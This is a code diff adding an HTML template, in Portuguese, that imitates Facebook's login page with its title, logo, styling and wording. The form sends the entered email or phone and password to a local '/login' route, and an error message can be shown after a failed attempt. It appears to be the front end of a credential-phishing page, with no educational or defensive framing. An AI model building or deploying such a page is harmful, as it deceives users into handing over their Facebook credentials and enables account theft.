@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook – entre ou cadastre-se</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 80px auto;
+            padding: 40px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .logo {
+            width: 200px;
+            margin-bottom: 30px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .forgot {
+            display: block;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .error {
+            color: red;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+        
+        {% if error %}
+            <div class="error">{{ error }}</div>
+        {% endif %}
+        
+        <form action="/login" method="post">
+            <input type="text" name="username" placeholder="Email ou telefone" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+        
+        <a class="forgot" href="#">Esqueceu a senha?</a>
+    </div>
+</body>
+</html>
